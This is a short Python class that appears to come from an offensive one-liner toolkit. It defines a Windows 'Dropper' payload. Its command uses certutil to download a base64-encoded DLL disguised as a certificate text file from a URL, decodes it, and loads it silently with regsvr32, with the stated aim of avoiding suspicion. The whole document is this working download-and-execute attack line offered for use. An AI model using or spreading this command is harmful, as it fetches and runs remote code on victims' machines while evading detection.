class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses certutil to download your base64 encoded dll file like a txt file to avoid suspicion."
    function    = "Dropper"
    liner     = """certutil -urlcache -split -f URL google_https_cert.txt && certutil -decode google_https_cert.txt https_cert.dll && regsvr32 /s /u https_cert.dll"""
